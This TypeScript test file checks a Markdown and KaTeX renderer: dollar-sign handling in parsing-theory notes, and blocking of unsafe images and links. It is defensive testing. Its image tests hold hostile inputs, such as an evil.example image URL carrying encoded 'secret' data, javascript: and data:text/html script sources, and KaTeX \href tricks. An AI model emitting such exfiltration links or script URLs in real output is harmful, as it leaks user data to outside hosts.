// Markdown rendering as the app does it (react-markdown + remark-math + rehype-katex with the exact
// options of web/src/lib/markdownOptions.ts). Run: node --test web/tests/*.test.ts
//
// KaTeX renders HTML only (no MathML); every formula carries its TeX source as aria-label.
import assert from 'node:assert/strict';
import { describe, test } from 'node:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import ReactMarkdown from 'react-markdown';
import {
  highlightLanguages,
  isAllowedImageSrc,
  rehypePlugins,
  remarkPlugins,
  urlTransform,
} from '../src/lib/markdownOptions.ts';
import { normalizeMathDelimiters } from '../src/lib/mathDelimiters.ts';

function render(markdown: string): string {
  return renderToStaticMarkup(
    createElement(ReactMarkdown, { remarkPlugins, rehypePlugins, urlTransform }, normalizeMathDelimiters(markdown)),
  );
}

function unescapeHtml(text: string): string {
  return text
    .replace(/&lt;/g, '<')
    .replace(/&gt;/g, '>')
    .replace(/&quot;/g, '"')
    .replace(/&#x27;/g, "'")
    .replace(/&amp;/g, '&');
}

/** TeX sources of the rendered formulas (the aria-label of each `.katex` element). */
function texOf(html: string): string[] {
  return [...html.matchAll(/<span class="katex" role="math" aria-label="([^"]*)">/g)].map((m) => unescapeHtml(m[1]));
}

/** Replace every KaTeX formula (`<span class="katex…">…</span>`, nested spans included) with ⟨math⟩. */
function withoutFormulas(html: string): string {
  let out = '';
  let i = 0;
  for (;;) {
    const start = html.indexOf('<span class="katex', i);
    if (start === -1) return out + html.slice(i);
    out += `${html.slice(i, start)}⟨math⟩`;
    let depth = 0;
    let j = start;
    do {
      const open = html.indexOf('<span', j);
      const close = html.indexOf('</span>', j);
      if (open !== -1 && open < close) {
        depth++;
        j = open + 5;
      } else {
        depth--;
        j = close + 7;
      }
    } while (depth > 0);
    i = j;
  }
}

/** Visible text outside of formulas (KaTeX output removed, tags stripped). */
function proseOf(html: string): string {
  return unescapeHtml(withoutFormulas(html).replace(/<[^>]+>/g, ''));
}

function assertRendersMath(markdown: string, expectedFormulas: number): string {
  const html = render(markdown);
  assert.doesNotMatch(html, /katex-error/, `KaTeX error for ${JSON.stringify(markdown)}:\n${html}`);
  const tex = texOf(html);
  assert.equal(tex.length, expectedFormulas, `formulas in ${JSON.stringify(markdown)}: ${JSON.stringify(tex)}`);
  return html;
}

describe('\\$ (end-of-input marker) inside math', () => {
  test('FOLLOW set in inline $…$', () => {
    const html = assertRendersMath('FOLLOW(Goal) = $\\{ \\$ \\}$', 1);
    assert.deepEqual(texOf(html), ['\\{ {\\char36} \\}']);
    assert.match(html, /<span class="mord">\$<\/span>/); // KaTeX draws a real "$"
    assert.equal(proseOf(html).trim(), 'FOLLOW(Goal) = ⟨math⟩');
  });

  test('several sets and markers in one paragraph', () => {
    const md =
      '$\\mathrm{FOLLOW}(E) = \\{ ), \\$ \\}$ 이고 $\\mathrm{FOLLOW}(T) = \\{ +, ), \\$ \\}$ 이에요. 시작 기호의 FOLLOW에는 항상 $\\$$가 들어가요.';
    const html = assertRendersMath(md, 3);
    assert.deepEqual(texOf(html), [
      '\\mathrm{FOLLOW}(E) = \\{ ), {\\char36} \\}',
      '\\mathrm{FOLLOW}(T) = \\{ +, ), {\\char36} \\}',
      '{\\char36}',
    ]);
  });

  test('\\( … \\) and \\[ … \\] delimiters', () => {
    assertRendersMath('\\( \\mathrm{FOLLOW}(E) = \\{ ), \\$ \\} \\)', 1);
    const display = assertRendersMath('집합은\n\\[\n\\mathrm{FOLLOW}(S) = \\{ \\$ \\}\n\\]\n입니다.', 1);
    assert.match(display, /katex-display/);
    const inlineDisplay = assertRendersMath('따라서 \\[ \\mathrm{FOLLOW}(S) = \\{ \\$ \\} \\] 이다.', 1);
    assert.match(inlineDisplay, /katex/);
  });

  test('display math $$ … $$', () => {
    assert.match(assertRendersMath('$$\\mathrm{FOLLOW}(A) = \\{ b, \\$ \\}$$', 1), /katex-display/);
    assert.match(assertRendersMath('$$\n\\mathrm{FOLLOW}(A) = \\{ b, \\$ \\}\n$$', 1), /katex-display/);
    // A display block inside a paragraph, then more inline math.
    assertRendersMath('집합:\n$$\n\\{ \\$ \\}\n$$\n그리고 $\\{ a, \\$ \\}$', 2);
  });

  test('LL(1) parse table with $ cells', () => {
    const md = [
      '| 비단말 | $\\texttt{id}$ | $+$ | $\\$$ |',
      '|---|---|---|---|',
      "| $E$ | $E \\to T E'$ | | |",
      "| $E'$ | | $E' \\to + T E'$ | $E' \\to \\varepsilon$ |",
      '| $ \\$ $ | $\\{ ), \\$ \\}$ | $\\texttt{\\$}$ | EOF |',
    ].join('\n');
    const html = assertRendersMath(md, 11);
    assert.match(html, /<table>/);
    assert.equal((html.match(/<tr>/g) ?? []).length, 4);
    assert.equal(texOf(html).filter((t) => t === '{\\char36}').length, 2); // `$\$$` and `$ \$ $`
    assert.ok(texOf(html).includes('\\texttt{{\\char36}}'));
  });

  test('EOF written as \\texttt{\\$}', () => {
    const html = assertRendersMath('입력 끝은 $\\texttt{\\$}$ 로 표시해요: $S \\Rightarrow^* \\alpha A \\texttt{\\$}$', 2);
    assert.deepEqual(texOf(html), ['\\texttt{{\\char36}}', 'S \\Rightarrow^* \\alpha A \\texttt{{\\char36}}']);
  });

  test('lists, headings, block quotes and multi-line inline math', () => {
    assertRendersMath('### FOLLOW = $\\{ \\$ \\}$\n\n- $\\mathrm{FOLLOW}(A) = \\{ b, \\$ \\}$\n- 다음 줄 $\\{ \\$ \\}$', 3);
    assertRendersMath('> 주의: $\\{ \\$ \\}$ 는 입력의 끝', 1);
    assertRendersMath('긴 식 $\\mathrm{FOLLOW}(S) =\n\\{ \\$ \\}$ 이어서', 1);
  });

  test('a realistic 정리본 entry', () => {
    const md = [
      '**FOLLOW 집합 계산 규칙**',
      '',
      '1. 시작 기호 $S$에 대해 $\\$ \\in \\mathrm{FOLLOW}(S)$',
      "2. $A \\to \\alpha B \\beta$ 이면 $\\mathrm{FIRST}(\\beta) - \\{\\varepsilon\\} \\subseteq \\mathrm{FOLLOW}(B)$",
      '',
      '| $A$ | $\\mathrm{FOLLOW}(A)$ |',
      '|:---:|:---:|',
      '| Goal | $\\{ \\$ \\}$ |',
      '| Expr | $\\{ \\$, ) \\}$ |',
      '',
      '핵심: 끝 표시 $\\$$는 시작 기호의 FOLLOW에 항상 들어가요.',
    ].join('\n');
    assertRendersMath(md, 9);
  });
});

describe('dollar signs that are not math', () => {
  test('escaped dollars in prose stay literal', () => {
    const html = render('가격은 \\$5 이고 $x$ 는 변수');
    assert.deepEqual(texOf(html), ['x']);
    assert.match(proseOf(html), /가격은 \$5 이고/);
  });

  test('code spans and fences are untouched', () => {
    const md = '인라인 `$\\{ \\$ \\}$` 코드\n\n```\n$\\{ \\$ \\}$ \\( x \\)\n```';
    assert.equal(normalizeMathDelimiters(md), md);
    const html = render(md);
    assert.equal(texOf(html).length, 0);
    assert.match(html, /<code>\$\\\{ \\\$ \\\}\$<\/code>/);
  });

  test('a stray $ in English prose does not swallow the text up to the next formula', () => {
    const html = assertRendersMath('The end marker $ is appended to the input; FIRST($\\alpha$) is computed first.', 1);
    assert.deepEqual(texOf(html), ['\\alpha']);
    assert.match(proseOf(html), /The end marker \$ is appended to the input; FIRST\(⟨math⟩/);
  });

  test('a stray $ in Korean prose does not swallow the text up to the next formula', () => {
    const html = assertRendersMath('입력 끝에 $를 붙이고, $\\alpha$의 FIRST를 구해요.', 1);
    assert.deepEqual(texOf(html), ['\\alpha']);
    assert.match(proseOf(html), /입력 끝에 \$를 붙이고/);
  });

  test('prices are not math', () => {
    const html = assertRendersMath('가격은 $5이고 할인하면 $3이에요. 변수 $x$ 도 있어요.', 1);
    assert.deepEqual(texOf(html), ['x']);
    assert.match(proseOf(html), /가격은 \$5이고 할인하면 \$3이에요/);
  });

  test('ordinary formulas (also with spaces inside) are still math', () => {
    assert.deepEqual(texOf(render('$x$ 와 $ x + y $ 그리고 $a_1 b$')), ['x', 'x + y', 'a_1 b']);
    assert.deepEqual(texOf(render('$1$번과 $2 + 3$ 그리고 $10^3$')), ['1', '2 + 3', '10^3']);
    assert.deepEqual(texOf(render('$\\text{시작 기호}$ 와 $x \\in \\{ 가, 나 \\}$')), ['\\text{시작 기호}', 'x \\in \\{ 가, 나 \\}']);
  });

  test('unbalanced math (still streaming) is left as it is', () => {
    for (const partial of ['FOLLOW = $\\{ \\$ ', 'a $x$ and \\( y', 'price: $']) {
      assert.equal(normalizeMathDelimiters(partial), partial);
    }
  });

  test('text without math is returned unchanged', () => {
    const md = '# 제목\n\n- 목록 `code`\n\n| a | b |\n|---|---|\n| 1 | 2 |';
    assert.equal(normalizeMathDelimiters(md), md);
  });
});

describe('images in LLM Markdown', () => {
  test('remote images are not loaded: they become links', () => {
    const html = render('요약 ![x](https://evil.example/c?d=c2VjcmV0) 끝');
    assert.doesNotMatch(html, /<img/);
    assert.doesNotMatch(html, /rel="preload"/);
    assert.match(html, /<a href="https:\/\/evil.example\/c\?d=c2VjcmV0" class="md-blocked-image"[^>]*>🖼 x \(evil.example\)<\/a>/);
  });

  test('protocol-relative, other-path, relative and script sources are refused', () => {
    for (const src of ['//evil.example/p.png', 'slides/001.png', '/slides/001.png', '/api/../x.png', 'javascript:alert(1)', 'http://127.0.0.1:9/api/x.png']) {
      const html = render(`![a](${src})`);
      assert.doesNotMatch(html, /<img/, src);
      assert.doesNotMatch(html, /javascript:/, src);
    }
    const ref = render('![logo][l]\n\n[l]: https://evil.example/logo.png');
    assert.doesNotMatch(ref, /<img/);
  });

  test('slide images from the app API and data: images are shown', () => {
    const slide = render('![slide 3](/api/docs/compiler-l7-abc123/slides/3.png)');
    assert.match(slide, /<img src="\/api\/docs\/compiler-l7-abc123\/slides\/3.png" alt="slide 3"\/>/);
    const data = render('![dot](data:image/png;base64,iVBORw0KGgo=)');
    assert.match(data, /<img src="data:image\/png;base64,iVBORw0KGgo=" alt="dot"\/>/);
  });

  test('ordinary links still work (they need a click)', () => {
    assert.match(render('[문서](https://example.com/doc)'), /<a href="https:\/\/example.com\/doc">문서<\/a>/);
    assert.doesNotMatch(render('[x](javascript:alert(1))'), /javascript:/);
  });

  test('KaTeX cannot be used to load images or add links', () => {
    const html = render('$\\includegraphics{https://evil.example/x.png}$ $\\href{https://evil.example}{x}$');
    assert.doesNotMatch(html, /<img/);
    assert.doesNotMatch(html, /href="https:\/\/evil/);
  });

  test('isAllowedImageSrc', () => {
    const origin = 'http://127.0.0.1:5180';
    assert.equal(isAllowedImageSrc('/api/docs/a/slides/1.png', origin), true);
    assert.equal(isAllowedImageSrc('http://127.0.0.1:5180/api/docs/a/slides/1.png', origin), true);
    assert.equal(isAllowedImageSrc('data:image/svg+xml,<svg/>', origin), true);
    assert.equal(isAllowedImageSrc('http://localhost:5180/api/x.png', origin), false);
    assert.equal(isAllowedImageSrc('https://evil.example/api/x.png', origin), false);
    assert.equal(isAllowedImageSrc('/\\evil.example/api/x.png', origin), false);
    assert.equal(isAllowedImageSrc('data:text/html,<script>', origin), false);
    assert.equal(isAllowedImageSrc('', origin), false);
  });
});

describe('KaTeX output (HTML only, DESIGN §15)', () => {
  test('no MathML copy; every formula is labelled with its TeX source', () => {
    const html = render('inline $a < b \\land c > "d"$ and\n\n$$\n\\sum_{i=1}^n i\n$$\n\nand \\( x^2 \\)');
    assert.doesNotMatch(html, /<math|<annotation|katex-mathml/);
    assert.deepEqual(texOf(html), ['a < b \\land c > "d"', '\\sum_{i=1}^n i', 'x^2']);
    // Display math: the label sits on the formula inside .katex-display.
    assert.match(html, /<span class="katex-display"><span class="katex" role="math" aria-label="\\sum_\{i=1\}\^n i">/);
    assert.match(html, /class="katex-html" aria-hidden="true"/);
  });

  test('the marker used to carry the source never reaches the DOM', () => {
    const html = render('$x$, $$y$$, $\\frac{$ and ```math\nz\n```');
    assert.doesNotMatch(html, /data-easy-study-tex|dataEasyStudyTex/i);
    assert.match(html, /katex-error/); // the broken formula still shows its source as an error
    assert.equal(proseOf(render('a $x$ b $$y$$ c')).trim(), 'a ⟨math⟩ b ⟨math⟩ c');
  });
});

describe('code highlighting', () => {
  test('only a small set of CS languages is registered', () => {
    assert.deepEqual(Object.keys(highlightLanguages).sort(), [
      'bash', 'c', 'cpp', 'diff', 'go', 'haskell', 'java', 'javascript', 'json', 'llvm', 'makefile', 'ocaml',
      'plaintext', 'python', 'rust', 'sql', 'typescript', 'x86asm', 'yaml',
    ]);
  });

  test('registered languages and their aliases are highlighted', () => {
    assert.match(render('```python\nx = 1\n```'), /<code class="hljs language-python">x = <span class="hljs-number">1<\/span>/);
    assert.match(render('```ts\nconst x: number = 1\n```'), /hljs-keyword/);
    assert.match(render('```asm\nmov eax, 1\n```'), /<span class="hljs-keyword">mov<\/span>/);
    assert.match(render('```ocaml\nlet rec f x = x\n```'), /hljs-keyword/);
  });

  test('other languages and fences without a language stay plain (no detection)', () => {
    assert.doesNotMatch(render('```kotlin\nval x = 1\n```'), /hljs-/);
    assert.doesNotMatch(render('```\nint main() { return 0; }\n```'), /hljs/);
  });
});
